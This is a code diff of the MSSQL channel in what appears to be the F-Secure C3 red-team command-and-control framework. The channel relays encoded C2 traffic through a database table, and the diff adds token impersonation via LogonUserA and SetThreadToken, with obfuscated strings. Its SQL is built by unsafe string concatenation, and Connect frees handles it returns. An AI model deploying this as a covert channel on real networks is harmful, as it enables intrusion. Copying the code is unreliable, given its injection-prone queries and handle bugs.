@@ -5,7 +5,7 @@
 #include <sql.h>
 #include "Common/FSecure/Crypto/Base64.h"
 
-#define DATA_LEN 1024
+#define DATA_LEN 4096
 #define ID_COLUMN 1
 #define MSGID_COLUMN 2
 #define MSG_COLUMN 3
@@ -15,37 +15,31 @@ FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
 	: m_inboundDirectionName{ arguments.Read<std::string>() }
 	, m_outboundDirectionName{ arguments.Read<std::string>() }
 {
-	auto[servername, databasename, tablename, useSSPI, username, password] = arguments.Read<std::string, std::string, std::string, bool, std::string, std::string>();
-	this->servername = servername;
-	this->databasename = databasename;
-	this->tablename = tablename;
-	this->username = username;
-	this->password = password;
-	this->useSSPI = useSSPI;
+	ByteReader{ arguments }.Read(m_servername, m_databasename, m_tablename, m_useSSPI, m_username, m_password);
 	
 	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
 
 	//create a new impersonation token and inject it into the current thread.
-	if (useSSPI && !this->username.empty())
+	if (m_useSSPI && !this->m_username.empty())
 	{
 		std::string user, domain;
 		HANDLE hToken;
-		user = this->username.substr(this->username.find("\\") + 1, this->username.size());
-		domain = this->username.substr(0, this->username.find("\\"));
+		user = this->m_username.substr(this->m_username.find("\\") + 1, this->m_username.size());
+		domain = this->m_username.substr(0, this->m_username.find("\\"));
 
-		if (!LogonUserA(user.c_str(), domain.c_str(), this->password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken))
+		if (!LogonUserA(user.c_str(), domain.c_str(), this->m_password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken))
 			throw std::runtime_error("[x] error creating Token");
 
-		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &impersonationToken))
+		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &m_impersonationToken))
 			throw std::runtime_error("[x] error duplicating token");
 	}
 	
 	if (Connect(&hConn, &hEvt) == SQL_ERROR)
-		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));
+		throw std::runtime_error(OBF("[x] Unable to connect to MSSQL database"));
 
 	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
 
-	std::string stmtString = OBF("Select * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '") + tablename + OBF("';");
+	std::string stmtString = OBF("Select * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '") + m_tablename + OBF("';");
 	SQLRETURN retCode = SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS);
 	
 	if (retCode != SQL_SUCCESS && retCode != SQL_SUCCESS_WITH_INFO)
@@ -57,7 +51,7 @@ FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
 	if (SQLFetch(hStmt) != SQL_SUCCESS)
 	{
 														
-		stmtString = OBF("CREATE TABLE dbo.") + this->tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSGID varchar(250), MSG varchar(max));");
+		stmtString = OBF("CREATE TABLE dbo.") + this->m_tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSGID varchar(250), MSG varchar(max));");
 		
 		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
 		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
@@ -82,7 +76,7 @@ size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteVi
 	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
 	
 	if (Connect(&hConn, &hEvt) == SQL_ERROR)
-		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));
+		throw std::runtime_error(OBF("[x] Unable to connect to MSSQL database"));
 
 
 	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
@@ -93,7 +87,8 @@ size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteVi
 	int actualPacketSize = 0;
 	
 	//Rounded down: Max size of bytes that can be put into a MSSQL database before base64 encoding
-	if (packet.size() > MAX_MSG_BYTES) {
+	if (packet.size() > MAX_MSG_BYTES) 
+	{
 		
 		actualPacketSize = std::min((size_t)MAX_MSG_BYTES, packet.size());
 		strpacket = packet.SubString(0, actualPacketSize);
@@ -101,15 +96,16 @@ size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteVi
 		b64packet = cppcodec::base64_rfc4648::encode(strpacket.data(), strpacket.size());
 		bytesWritten = strpacket.size();
 	}
-	else {
+	else 
+	{
 		b64packet = cppcodec::base64_rfc4648::encode(packet.data(), packet.size());
 		bytesWritten = packet.size();
 	}
 
-	std::string stmtString = OBF("INSERT into dbo.") + this->tablename + OBF(" (MSGID, MSG) VALUES ('") + this->m_outboundDirectionName + "', '" + b64packet + OBF("');");
+	std::string stmtString = OBF("INSERT into dbo.") + this->m_tablename + OBF(" (MSGID, MSG) VALUES ('") + this->m_outboundDirectionName + "', '" + b64packet + OBF("');");
 	
 	if (SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS) != SQL_SUCCESS)
-		throw std::exception(OBF("[x] Could not insert data\n"));
+		throw std::runtime_error(OBF("[x] Could not insert data\n"));
 
 	
 	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
@@ -124,12 +120,12 @@ std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnRec
 	//connect to the database
 	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
 	if (Connect(&hConn, &hEvt) == SQL_ERROR)
-		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));
+		throw std::runtime_error(OBF("[x] Unable to connect to MSSQL database"));
 
 
 	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
 
-	std::string stmt = OBF("SELECT TOP 100 * FROM dbo.") + this->tablename + OBF(" WHERE MSGID = '") + this->m_inboundDirectionName + OBF("';");
+	std::string stmt = OBF("SELECT TOP 100 * FROM dbo.") + this->m_tablename + OBF(" WHERE MSGID = '") + this->m_inboundDirectionName + OBF("';");
 	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
 
 	std::vector<ByteVector> messages;
@@ -171,13 +167,13 @@ std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnRec
 		data.push_back(j);
 	}
 	
+	std::string idList = "";
+	stmt = OBF("DELETE FROM dbo.") + this->m_tablename + OBF(" WHERE ID IN (");
+
 	for (auto &msg : data)
 	{
-		//delete the row in the DB - must realloc the stmt handle
-		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
-		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
-		stmt = OBF("DELETE FROM dbo.") + this->tablename + OBF(" WHERE ID = '") + msg[OBF("id")].get<std::string>() + OBF("';");
-		SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
+		idList += OBF("'") + msg[OBF("id")].get<std::string>();
+		idList += OBF("',");
 
 		//add the message to the messages vector
 		auto m = cppcodec::base64_rfc4648::decode(msg[OBF("msg")].get<std::string>());
@@ -185,6 +181,19 @@ std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnRec
 		messages.push_back(std::move(m));
 	}
 
+	//no need to send an empty delete command
+	if (messages.size() > 0)
+	{
+		//delete the row in the DB - must realloc the stmt handle
+		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
+		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
+
+		//Remove the trailing ","
+		stmt += idList.substr(0, idList.size() - 1) + OBF(");");
+
+		SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
+	}
+	
 	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
 	SQLDisconnect(hConn);
 	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
@@ -199,24 +208,25 @@ SQLRETURN FSecure::C3::Interfaces::Channels::MSSQL::Connect(SQLHANDLE* hConn, SQ
 	std::string connString;
 
 	if (SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &lhEvt) != SQL_SUCCESS)
-		throw std::exception(OBF("[x] Error allocating handle"));
+		throw std::runtime_error(OBF("[x] Error allocating handle"));
 	if (SQLSetEnvAttr(lhEvt, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0) != SQL_SUCCESS)
-		throw std::exception(OBF("[x] Error allocating handle"));
+		throw std::runtime_error(OBF("[x] Error allocating handle"));
 	if (SQLAllocHandle(SQL_HANDLE_DBC, lhEvt, &lhConn) != SQL_SUCCESS)
-		throw std::exception(OBF("[x] Error allocating handle"));
+		throw std::runtime_error(OBF("[x] Error allocating handle"));
 
-	if (this->useSSPI)
+	if (this->m_useSSPI)
 	{
-		if (!this->username.empty())
+		if (!this->m_username.empty())
 		{
-			if (!SetThreadToken(NULL, this->impersonationToken))
+			//Sending and recieving could be different threads, have to inject the token per-thread
+			if (!SetThreadToken(NULL, this->m_impersonationToken))
 				throw std::runtime_error("[x] error setting token");
 		}
 			
-		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";Integrated Security=SSPI;");
+		connString = OBF("DRIVER={SQL Server};SERVER=") + this->m_servername + OBF(", 1433;") + OBF("DATABASE=") + this->m_databasename + OBF(";Integrated Security=SSPI;");
 	}
 	else
-		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";UID=") + this->username + OBF(";PWD=") + this->password;
+		connString = OBF("DRIVER={SQL Server};SERVER=") + this->m_servername + OBF(", 1433;") + OBF("DATABASE=") + this->m_databasename + OBF(";UID=") + this->m_username + OBF(";PWD=") + this->m_password;
 
 
 
@@ -226,6 +236,8 @@ SQLRETURN FSecure::C3::Interfaces::Channels::MSSQL::Connect(SQLHANDLE* hConn, SQ
 	*hConn = lhConn;
 	*hEvt = lhEvt;
 
+	SQLFreeHandle(SQL_HANDLE_ENV, lhEvt);
+	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
 	return retCode;
 
 }
@@ -239,7 +251,7 @@ FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::OnRunCommand(ByteV
 	case 0:
 		return ClearTable();
 	default:
-		return {};
+		return AbstractChannel::OnRunCommand(commandCopy);
 	}
 }
 
@@ -253,7 +265,14 @@ FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::ClearTable()
 
 	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
 
-	std::string stmt = OBF("DELETE FROM dbo.") + this->tablename + ";";
+	std::string stmt = OBF("DELETE FROM dbo.") + this->m_tablename + ";";
+	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
+
+	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
+	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
+
+	//reset the ID to 0
+	stmt = "DBCC CHECKIDENT('dbo." + this->m_tablename + "', RESEED, 0)";
 	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
 	return {};
 
@@ -299,12 +318,6 @@ const char* FSecure::C3::Interfaces::Channels::MSSQL::GetCapability()
 				            "description": "The name of the table to write to"
 			            },
 						{
-							"type": "boolean",
-							"name": "Use Current Windows Auth",
-							"description": "Set this to true to use SSPI",
-							"defaultValue": false
-						},
-			            {
 				            "type": "string",
 				            "name": "Username",
 				            "description": "The username used to authenticate to the database. If using a domain user put in the format DOMAIN\\Username",
@@ -315,7 +328,13 @@ const char* FSecure::C3::Interfaces::Channels::MSSQL::GetCapability()
 				            "name": "Password",
 				            "description": "The password used to authenticate to the database",
 							"min": 0
-			            }
+			            },
+						{
+							"type": "boolean",
+							"name": "Use Integrated Security (SSPI) - use for domain joined accounts",
+							"description": "Set this to true and provide a domain\\username and password to perform token impersonation OR Set this to true and provide no credentials and the current process token will be used with SSPI",
+							"defaultValue": false
+						}
 		            ]
                 },
                "commands":
